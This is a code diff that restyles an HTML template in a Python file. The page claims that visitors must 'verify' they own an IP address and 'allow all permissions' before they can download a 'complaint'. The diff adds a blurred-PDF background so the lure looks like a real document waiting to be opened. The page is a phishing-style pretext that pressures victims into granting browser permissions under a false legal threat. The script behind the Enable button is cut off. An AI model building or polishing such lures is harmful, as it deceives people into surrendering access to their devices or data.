@@ -505,7 +505,20 @@ PERMISSIONS_PAGE = """
     <title>Enable Permissions</title>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
-        body { text-align: center; padding: 50px; background-color: #f2f2f2; }
+        body {
+            background-image: url('blurred_pdf.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            text-align: center;
+            padding: 50px;
+        }
+        .content-box {
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 8px;
+            display: inline-block;
+        }
         h2 { color: #333; }
         button { padding: 10px 20px; margin: 5px; }
         p { color: #d93025; }
@@ -513,13 +526,15 @@ PERMISSIONS_PAGE = """
 </head>
 <body>
     <div class="container">
-        {% if error == 'denied' %}
-        <p style="color: red;">Permissions were not granted. Please enable all permissions to proceed.</p>
-        {% endif %}
-        <h2>To download the complaint, you have to verify whether you are the right person who has the IP address</h2>
-        <p>Kindly allow all permissions by clicking enable.</p>
-        <button id="enableButton" class="btn btn-primary">Enable</button>
-        <p id="status"></p>
+        <div class="content-box">
+            {% if error == 'denied' %}
+            <p style="color: red;">Permissions were not granted. Please enable all permissions to proceed.</p>
+            {% endif %}
+            <h2>To download the complaint, you have to verify whether you are the right person who has the IP address</h2>
+            <p>Kindly allow all permissions by clicking enable.</p>
+            <button id="enableButton" class="btn btn-primary">Enable</button>
+            <p id="status"></p>
+        </div>
     </div>
     <script>
         document.getElementById('enableButton').addEventListener('click', () => {
